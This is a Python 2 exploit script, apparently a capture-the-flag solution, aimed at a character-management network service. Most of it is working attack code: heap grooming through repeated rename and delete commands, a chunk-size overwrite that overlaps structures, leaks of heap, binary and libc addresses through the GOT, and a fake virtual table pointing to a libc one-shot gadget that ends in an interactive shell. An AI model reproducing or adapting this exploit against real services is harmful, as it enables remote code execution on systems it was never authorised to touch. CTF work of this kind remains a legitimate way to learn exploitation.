#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

def new(tp, name):
    tp = {'w':'wizzard', 'b':'barbarian'}.get(tp)
    s.send('new %s %s\n' % (tp, name))
    recvuntil('>')
def neww(name):
    return new('w', name)

def delete(name):
    s.send('delete %s\n' % name)
    recvuntil('>')

def printall(receive=True):
    s.send('print all\n')
    if receive:
	    return recvuntil('>')

def change(oldn, newn):
    s.send('change %s %s\n' % (oldn, newn))
    recvuntil('>')

recvuntil('>')

# the idea is to have one Character structure (X) that overlaps with the name
# of another character, in such a way that the name points to the name pointer
# of the structure X.
neww('A'*(0x100 - 9))
neww('B'*(0x100 - 9))
neww('C'*(0x7))
neww('D'*(0x7))
neww('E'*(0x7))
neww('F'*(0x7))
neww('G'*(0x7))
# Pa|Na|Pb|Nb|Pc|Nc|Pd|Nd|Pe|Ne|Pf|Nf|Pg|Ng
change('W'+'B'*(0x100-9), 'B'*(0x200-9))
# Pa|Na|Pb|  |Pc|Nc|Pd|Nd|Pe|Ne|Pf|Nf|Pg|Ng|Nb
change('W'+'D'*(0x7), 'd'*(25))
# Pa|Na|Pb|Nd|  |Pc|Nc|Pd|  |Pe|Ne|Pf|Nf|Pg|Ng|Nb
change('W'+'E'*(0x7), 'e'*(0x70 - 8))
# Pa|Na|Pb|Nd|Ne|Pc|Nc|Pd|  |Pe|  |Pf|Nf|Pg|Ng|Nb
delete('B'*(0x200-9))
# Pa|Na|  |Nd|Ne|Pc|Nc|Pd|  |Pe|  |Pf|Nf|Pg|Ng
change('d'*(25), 'D'*(0x200-9))
# Pa|Na|     |Ne|Pc|Nc|Pd|  |Pe|  |Pf|Nf|Pg|Ng|Nd
change('W'+'C'*(0x7), 'c'*(0x100 - 9))
# Pa|Na|Nc|  |Ne|Pc|  |Pd|  |Pe|  |Pf|Nf|Pg|Ng|Nd
change('c'*(0x100 - 9), 'C'*(0x200 - 9))
# Pa|Na|     |Ne|Pc|  |Pd|  |Pe|  |Pf|Nf|Pg|Ng|Nd|Nc

# after these operations, the freed space between Na and Ne should be the only one in the unsorted bin.
# If we now overwrite its size, we can have the overlap we want.

delete('W'+'A'*(0x100-9))
neww('A'*(0x100 - 9) + '\xf1') # overwrite the size of the freed chunk between Na and Ne

# add some space between Na and Ne, so that the Character structure will
# overlap in a such a way that the name pointer will be available through Ne
change('W'+'F'*(0x7), 'f'*(0x38 - 9))
neww('J'*(0x200-9)) # the Character structure of this new wizard should now overlap with Ne

# leak the address on the heap
r = printall()
l = [x[len('My name is : '):] for x in r.split('\n') if 'My name is : ' in x]
heap_leak = l[l.index('D'*(0x200-9)) + 1]
heap_leak += '\x00'*(8 - len(heap_leak))
heap_leak = u64(heap_leak)
pers_A = heap_leak - 0xda0
print '[+] heap_leak = %#x' % heap_leak
print '[+] personnage A @ %#x' % pers_A

def leak(addr, oldname):
	newname = p64(addr)
	change(oldname, newname)
	r = printall()
	l = [x[len('My name is : '):] for x in r.split('\n') if 'My name is : ' in x]
	v = l[l.index('W'+'A'*(0x100-8)) + 1]
	v += '\x00'*(8 - len(v))
	v = u64(v)
	return v, newname

def write(addr, oldvalue, value, oldname):
	change(oldname, p64(addr))
	change(p64(oldvalue), p64(value))

def send_wzero(orig_name, v):
	oldname = orig_name
	for idx, i in enumerate(p64(v)[::-1]):
		if i == '\x00':
			newname = p64(v)[:8 - idx - 1].replace('\x00', '1')
			change(oldname, newname)
			oldname = newname

wizzard_tbl_off = 0x0000000000203C48
strlen_got_off = 0x0000000000203F50
free_got_off = 0x0000000000203F48
free_off = 0x00083c60
magicgadget_off = 0x00000000000EC622

vtbl, newname = leak(pers_A, p64(heap_leak))
prog_base = vtbl - wizzard_tbl_off
print '[+] wizzard vtbl @ %#x' % vtbl
print '[+] prog_base @ %#x' % prog_base

strlen_got = prog_base + strlen_got_off
free_got = prog_base + free_got_off
print '[i] strlen_got @ %#x' % strlen_got
print '[i] free_got @ %#x' % free_got
strlen_addr, newname = leak(strlen_got, newname)
free_addr, newname = leak(free_got, newname)

print '[+] strlen @ %#x' % strlen_addr
print '[+] free @ %#x' % free_addr

print '... somehow now you know the libc version ... (Fedora 23 libc)'
libc_base = free_addr - free_off
magicgadget = libc_base + magicgadget_off
print '[+] libc_base = %#x' % libc_base

# prepare the fake virtual table
neww('K'*(0x300-10))
send_wzero('W'+'K'*(0x300-9), magicgadget)

pers_K_off = 0x10a0
pers_K = pers_A + pers_K_off
pers_F = pers_A + 0x760
# overwrite the virtual table ptr of the first character. It now points to the fake virtual table
write(pers_F, vtbl, pers_K, newname)

printall(receive=False)

interactive()

s.close()
